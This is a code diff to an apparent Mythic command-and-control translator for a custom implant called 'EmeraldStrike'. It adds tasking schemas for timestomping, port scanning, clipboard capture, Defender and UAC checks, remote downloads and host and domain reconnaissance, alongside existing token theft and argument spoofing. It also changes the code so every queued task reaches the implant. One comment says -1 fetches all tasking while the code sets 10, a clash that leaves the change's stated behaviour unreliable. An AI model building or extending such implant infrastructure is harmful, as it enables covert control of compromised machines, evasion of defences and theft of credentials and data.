@@ -157,6 +157,35 @@ _CMD_SCHEMAS = {
     "steal_token":       [("pid", "int32")],
     "make_token":        [("domain", "string"), ("username", "string"), ("password", "string")],
     "blockdlls":         [("action", "string")],
+    "find":             [("dir", "string"), ("pattern", "string")],
+    "grep":             [("dir", "string"), ("term", "string"), ("ext", "string")],
+    "tree":             [("dir", "string"), ("depth", "string")],
+    "stat":             [("path", "string")],
+    "timestomp":        [("source", "string"), ("dest", "string")],
+    "wget":             [("url", "string"), ("path", "string")],
+    "psgrep":           [("term", "string")],
+    "procinfo":         [("pid", "string")],
+    "portscan":         [("host", "string"), ("ports", "string")],
+    "curl":             [("url", "string"), ("method", "string"), ("body", "string")],
+    "env":              [],
+    "drivers":          [],
+    "services":         [],
+    "software":         [],
+    "netstat":          [],
+    "arp":              [],
+    "route":            [],
+    "localgroup":       [],
+    "share":            [],
+    "domaininfo":       [],
+    "uac":              [],
+    "defender":         [],
+    "windowlist":       [],
+    "uptime":           [],
+    "quser":            [],
+    "clipboard":        [],
+    "ping":             [("host", "string"), ("count", "string")],
+    "dns":              [("host", "string")],
+    "tasks":            [],
     "argue":             [("action", "string"), ("fake_args", "string")],
 }
 
@@ -226,18 +255,23 @@ class EmeraldStrikeTranslator(TranslationContainer):
             buf = b""
             action = msg.get("action", "")
             if action == "get_tasking" and "tasks" in msg and msg["tasks"]:
-                task = msg["tasks"][0]
-                command = task.get("command", "")
-                buf += _pack_tlv(TLV_TYPE_COMMAND, command)
-                buf += _pack_tlv(TLV_TYPE_TASKID, task.get("id", ""))
-                params = task.get("parameters", "")
-                if isinstance(params, str):
-                    try:
-                        params = json.loads(params)
-                    except Exception:
-                        pass
-                params_packed = _pack_params(command, params) if isinstance(params, dict) else b""
-                buf += _pack_tlv(TLV_TYPE_DATA, params_packed)
+                # Pack EVERY queued task as its own TLV_COMMAND/TLV_TASKID/
+                # TLV_DATA triple. Mythic delivers the full queue in one
+                # get_tasking reply; packing only tasks[0] left the rest marked
+                # delivered server-side but never executed (stuck "agent
+                # processing" forever). The agent iterates all TLVs.
+                for task in msg["tasks"]:
+                    command = task.get("command", "")
+                    buf += _pack_tlv(TLV_TYPE_COMMAND, command)
+                    buf += _pack_tlv(TLV_TYPE_TASKID, task.get("id", ""))
+                    params = task.get("parameters", "")
+                    if isinstance(params, str):
+                        try:
+                            params = json.loads(params)
+                        except Exception:
+                            pass
+                    params_packed = _pack_params(command, params) if isinstance(params, dict) else b""
+                    buf += _pack_tlv(TLV_TYPE_DATA, params_packed)
             elif action == "checkin":
                 if "id" in msg:
                     buf += _pack_tlv(TLV_TYPE_TASKID, msg["id"])
@@ -320,7 +354,11 @@ class EmeraldStrikeTranslator(TranslationContainer):
                 cmd = tlvs[TLV_TYPE_COMMAND].decode("utf-8")
                 msg["action"] = cmd
                 if cmd == "get_tasking":
-                    msg["tasking_size"] = 1
+                    # -1 = Mythic returns ALL queued tasking for this callback
+                    # in one response (docs.mythic-c2.net, action_get_tasking).
+                    # The old value of 1 serialized the queue one-task-per-
+                    # checkin; bursts left tasks stuck server-side forever.
+                    msg["tasking_size"] = 10
 
             if TLV_TYPE_TASKID in tlvs:
                 msg["id"] = tlvs[TLV_TYPE_TASKID].decode("utf-8")
